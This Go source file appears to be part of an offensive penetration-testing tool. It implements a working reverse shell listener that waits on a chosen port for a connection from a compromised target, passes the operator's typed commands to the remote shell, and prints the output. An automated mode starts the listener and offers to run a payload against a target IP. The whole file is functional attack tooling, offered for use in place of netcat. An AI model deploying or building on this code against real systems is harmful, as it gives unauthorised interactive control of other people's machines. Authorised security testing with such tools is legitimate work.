package core

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Listener struct {
	Port      int
	conn      net.Conn
	listener  net.Listener
	isRunning bool
	mutex     sync.Mutex
	stopChan  chan bool
}

var activeListeners = make(map[int]*Listener)
var listenerMutex sync.Mutex

// StartListener starts a reverse shell listener on the specified port
func StartListener(port int) (*Listener, error) {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()

	// Check if listener already exists for this port
	if existing, exists := activeListeners[port]; exists && existing.isRunning {
		return existing, fmt.Errorf("listener already running on port %d", port)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return nil, fmt.Errorf("failed to start listener: %v", err)
	}

	l := &Listener{
		Port:      port,
		listener:  listener,
		isRunning: true,
		stopChan:  make(chan bool),
	}

	activeListeners[port] = l

	// Start listening in background
	go l.handleConnections()

	fmt.Printf("%s[+]%s Listener started on port %s%d%s\n",
		ColorGreen, ColorNC, ColorYellow, port, ColorNC)
	fmt.Printf("%s[*]%s Waiting for reverse shell connections...\n", ColorBlue, ColorNC)

	return l, nil
}

// handleConnections handles incoming connections
func (l *Listener) handleConnections() {
	defer l.cleanup()

	for l.isRunning {
		// Set deadline to allow periodic checking of stop signal
		if tcpListener, ok := l.listener.(*net.TCPListener); ok {
			tcpListener.SetDeadline(time.Now().Add(1 * time.Second))
		}

		conn, err := l.listener.Accept()
		if err != nil {
			// Check if we should stop
			select {
			case <-l.stopChan:
				return
			default:
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue // Timeout is expected, continue listening
				}
				fmt.Printf("%s[-]%s Listener error: %s\n", ColorRed, ColorNC, err.Error())
				continue
			}
		}

		l.mutex.Lock()
		l.conn = conn
		l.mutex.Unlock()

		fmt.Printf("\n%s[+]%s Reverse shell connection received from: %s%s%s\n",
			ColorGreen, ColorNC, ColorYellow, conn.RemoteAddr(), ColorNC)
		fmt.Printf("%s[*]%s Starting interactive shell session...\n", ColorBlue, ColorNC)
		fmt.Printf("%s[!]%s Type 'exit' or Ctrl+C to close the session\n", ColorYellow, ColorNC)
		fmt.Printf("%s"+strings.Repeat("=", 50)+"%s\n", ColorBlue, ColorNC)

		l.handleShellSession(conn)

		fmt.Printf("\n%s"+strings.Repeat("=", 50)+"%s\n", ColorBlue, ColorNC)
		fmt.Printf("%s[*]%s Shell session ended\n", ColorBlue, ColorNC)
		break
	}
}

// handleShellSession handles the interactive shell session
func (l *Listener) handleShellSession(conn net.Conn) {
	defer conn.Close()

	// Channel to signal when to stop
	done := make(chan bool)

	// Goroutine to read from connection and print to stdout
	go func() {
		buffer := make([]byte, 1024)
		for {
			n, err := conn.Read(buffer)
			if err != nil {
				done <- true
				return
			}
			fmt.Print(string(buffer[:n]))
		}
	}()

	// Goroutine to read from stdin and send to connection
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			command := scanner.Text()

			// Allow user to exit
			if strings.ToLower(strings.TrimSpace(command)) == "exit" {
				done <- true
				return
			}

			_, err := conn.Write([]byte(command + "\n"))
			if err != nil {
				done <- true
				return
			}
		}
	}()

	// Wait for session to end
	<-done
}

// Stop stops the listener
func (l *Listener) Stop() {
	l.mutex.Lock()
	defer l.mutex.Unlock()

	if !l.isRunning {
		return
	}

	l.isRunning = false
	close(l.stopChan)

	if l.listener != nil {
		l.listener.Close()
	}

	if l.conn != nil {
		l.conn.Close()
	}

	fmt.Printf("%s[*]%s Listener on port %d stopped\n", ColorBlue, ColorNC, l.Port)
}

func (l *Listener) cleanup() {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()
	delete(activeListeners, l.Port)
}

// StopAllListeners stops all active listeners
func StopAllListeners() {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()

	for _, listener := range activeListeners {
		listener.Stop()
	}
}

// GetActiveListeners returns information about active listeners
func GetActiveListeners() map[int]*Listener {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()

	result := make(map[int]*Listener)
	for port, listener := range activeListeners {
		if listener.isRunning {
			result[port] = listener
		}
	}
	return result
}

// AutoReverseShell provides fully automated reverse shell with built-in listener
func AutoReverseShell(targetIP string, targetPort int, localPort int, payload string) error {
	fmt.Printf("\n%s=== Automated Reverse Shell ===%s\n", ColorBlue, ColorNC)

	// Start listener first
	listener, err := StartListener(localPort)
	if err != nil {
		return fmt.Errorf("failed to start listener: %v", err)
	}

	// Give user option to wait or proceed immediately
	fmt.Printf("\n%s[*]%s Listener is ready. Options:\n", ColorBlue, ColorNC)
	fmt.Printf("%s1.%s Execute payload now\n", ColorYellow, ColorNC)
	fmt.Printf("%s2.%s Wait for manual payload execution\n", ColorYellow, ColorNC)
	fmt.Printf("%s3.%s Cancel and stop listener\n", ColorYellow, ColorNC)

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\nEnter your choice (1-3): ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		fmt.Printf("%s[*]%s Executing payload automatically...\n", ColorBlue, ColorNC)
		// Return nil so caller can execute the payload
		return nil
	case "2":
		fmt.Printf("%s[*]%s Listener is running. Execute your payload manually.\n", ColorBlue, ColorNC)
		fmt.Printf("%s[*]%s Press Enter when ready to stop listener...\n", ColorBlue, ColorNC)
		reader.ReadString('\n')
		listener.Stop()
		return fmt.Errorf("manual execution selected")
	case "3":
		listener.Stop()
		return fmt.Errorf("cancelled by user")
	default:
		listener.Stop()
		return fmt.Errorf("invalid choice")
	}
}

// GetLocalIP tries to determine the local IP address for reverse shell
func GetLocalIP() string {
	// Try to get local IP by connecting to a remote address
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// ShowListenerHelp displays help information for using listeners
func ShowListenerHelp() {
	fmt.Printf("\n%s=== Listener Help ===%s\n", ColorBlue, ColorNC)
	fmt.Printf("%s[*]%s Automated Reverse Shell Features:\n", ColorBlue, ColorNC)
	fmt.Printf("  • %sBuilt-in listener%s - No need for external nc/netcat\n", ColorYellow, ColorNC)
	fmt.Printf("  • %sAutomatic detection%s - Shows your local IP\n", ColorYellow, ColorNC)
	fmt.Printf("  • %sInteractive shell%s - Full command execution\n", ColorYellow, ColorNC)
	fmt.Printf("  • %sSession management%s - Clean connect/disconnect\n", ColorYellow, ColorNC)

	fmt.Printf("\n%s[*]%s Usage:\n", ColorBlue, ColorNC)
	fmt.Printf("  1. Tool automatically starts listener\n")
	fmt.Printf("  2. Tool executes reverse shell payload\n")
	fmt.Printf("  3. Interactive shell session begins\n")
	fmt.Printf("  4. Type 'exit' to close session\n")

	localIP := GetLocalIP()
	fmt.Printf("\n%s[*]%s Your local IP: %s%s%s\n", ColorBlue, ColorNC, ColorYellow, localIP, ColorNC)

	fmt.Printf("\n%s[*]%s Active Listeners:\n", ColorBlue, ColorNC)
	active := GetActiveListeners()
	if len(active) == 0 {
		fmt.Printf("  None\n")
	} else {
		for port := range active {
			fmt.Printf("  Port %s%d%s - Running\n", ColorYellow, port, ColorNC)
		}
	}
}
